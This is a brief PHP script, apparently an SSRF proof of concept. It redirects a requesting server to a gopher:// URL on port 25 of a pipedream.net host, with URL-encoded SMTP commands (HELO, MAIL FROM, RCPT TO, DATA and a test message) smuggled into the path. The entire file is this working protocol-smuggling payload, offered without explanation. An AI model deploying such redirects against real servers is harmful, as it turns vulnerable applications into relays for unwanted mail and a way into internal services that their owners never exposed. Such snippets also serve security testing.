<?php
        $commands = array(
                'HELO test.org',
                'MAIL FROM: <aaaaaaaaaaa@tester.com>',
                'RCPT TO: <bit-bucket@test.smtp.org>',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://enbp0bq4bhp8v.x.pipedream.net:25/_'.$payload);
?>
